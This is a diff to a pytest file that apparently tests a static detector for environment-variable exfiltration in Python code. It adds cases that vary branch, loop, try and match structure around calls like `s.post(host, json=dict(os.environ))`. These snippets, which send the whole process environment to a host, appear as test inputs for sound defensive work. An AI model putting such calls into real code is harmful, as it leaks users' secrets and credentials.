@@ -1535,6 +1535,41 @@ def test_python_client_handle_binding_matches_runtime(tmp_path: Path, source: st
         # treating both as executed is exactly the over-reporting that hard-blocks benign files. The
         # prelude takes the `else` path, so the runtime shows which receiver really answers.
         ("flag = False\ns = config\n", "import os\nimport requests\n\nif flag:\n    s = requests.Session()\nelse:\n    s.post(host, json=dict(os.environ))\n", ["config"], False),
+        # Issue #4296 case 1, now reported: a part that cannot follow a sibling keeps the enclosing
+        # handle, and the rebind on the later line cannot retract the call already made on the first.
+        ("flag = True\n", "import os\nimport requests\n\ns = requests.Session()\nif flag:\n    s.post(host, json=dict(os.environ))\n    s = config\n", ["client"], True),
+        # The same two statements in the other order really are benign, so the case above is not
+        # passing because an `if` body is walked without ordering its bindings.
+        ("flag = True\n", "import os\nimport requests\n\ns = requests.Session()\nif flag:\n    s = config\n    s.post(host, json=dict(os.environ))\n", ["config"], False),
+        # A loop body is the first thing its statement runs, so the same rule applies there.
+        ("", "import os\nimport requests\n\ns = requests.Session()\nfor _ in [1]:\n    s.post(host, json=dict(os.environ))\n    s = config\n", ["client"], True),
+        # The loop `else` is different: it always follows the body, so a handle the body replaced must
+        # not be read as live there.
+        ("", "import os\nimport requests\n\ns = requests.Session()\nfor _ in [1]:\n    s = config\nelse:\n    s.post(host, json=dict(os.environ))\n", ["config"], False),
+        # A `try` body starts from the state at the statement, and a `finally` does not.
+        ("", "import os\nimport requests\n\ns = requests.Session()\ntry:\n    s.post(host, json=dict(os.environ))\n    s = config\nexcept Exception:\n    pass\n", ["client"], True),
+        ("", "import os\nimport requests\n\ns = requests.Session()\ntry:\n    s = config\nfinally:\n    s.post(host, json=dict(os.environ))\n", ["config"], False),
+        # Exactly one `match` case runs, so a case body cannot follow another case's binding.
+        ("value = 1\n", "import os\nimport requests\n\ns = requests.Session()\nmatch value:\n    case 1:\n        s.post(host, json=dict(os.environ))\n        s = config\n", ["client"], True),
+        # A capture target is not a sibling binding: it rebinds the name as the statement dispatches,
+        # so the enclosing handle is already gone before the matched body runs.
+        ("value = [1]\n", "import os\nimport requests\n\ns = requests.Session()\nmatch value:\n    case [s]:\n        s.post(host, json=dict(os.environ))\n", [], False),
+        # A handler's `as` name is the same case: it shadows the handle for its own body.
+        ("", "import os\nimport requests\n\ns = requests.Session()\ntry:\n    float('x')\nexcept Exception as s:\n    s.post(host, json=dict(os.environ))\n", [], False),
+        # The header is evaluated *before* the dispatch-time binding exists, so a sink there runs
+        # under the enclosing handle even when the target/capture reuses that name.
+        ("", "import os\nimport requests\n\ns = requests.Session()\nfor s in s.post(host, json=dict(os.environ)):\n    pass\n", ["client"], True),
+        ("", "import os\nimport requests\n\ns = requests.Session()\nmatch s.post(host, json=dict(os.environ)):\n    case [s]:\n        pass\n", ["client"], True),
+        # ... and the inverse, which is why the dispatch names are still dropped before the body:
+        # inside the body `s` is the loop value, not the handle.
+        ("", "import os\nimport requests\n\ns = requests.Session()\nfor s in [1]:\n    s.post(host, json=dict(os.environ))\n", [], False),
+        # Two levels of branching: the branches are mutually exclusive, so a rebind in the `if` body
+        # cannot retract a sink in the `elif` body.
+        ("a = False\nb = True\n", "import os\nimport requests\n\ns = requests.Session()\nif a:\n    s = config\nelif b:\n    s.post(host, json=dict(os.environ))\n", ["client"], True),
+        # A `while` body is the first thing its statement runs, same rule as `for`.
+        ("flag = True\n", "import os\nimport requests\n\ns = requests.Session()\nwhile flag:\n    s.post(host, json=dict(os.environ))\n    flag = False\n    s = config\n", ["client"], True),
+        # A `try` `else` always follows the body, so the body's rebind must reach it.
+        ("", "import os\nimport requests\n\ns = requests.Session()\ntry:\n    s = config\nexcept Exception:\n    pass\nelse:\n    s.post(host, json=dict(os.environ))\n", ["config"], False),
     ],
 )
 def test_python_branch_bodies_are_walked_without_leaking_bindings(tmp_path: Path, prelude: str, source: str, receivers: list[str], is_exfil: bool) -> None:
@@ -1557,9 +1592,6 @@ def test_python_import_over_a_live_handle_drops_it(tmp_path: Path) -> None:
 @pytest.mark.parametrize(
     "source",
     [
-        # A name the compound statement both calls and rebinds. Which value survives depends on the
-        # path taken, so the handle is dropped rather than resolved.
-        "import os\nimport requests\n\ns = requests.Session()\nif flag:\n    s.post(host, json=dict(os.environ))\n    s = config\n",
         # A construction on a branch that really runs, observed after the statement.
         "import os\nimport requests\n\nif flag:\n    s = requests.Session()\ns.post(host, json=dict(os.environ))\n",
         # A walrus that really executes: whether and when it runs is undecidable in general, so the
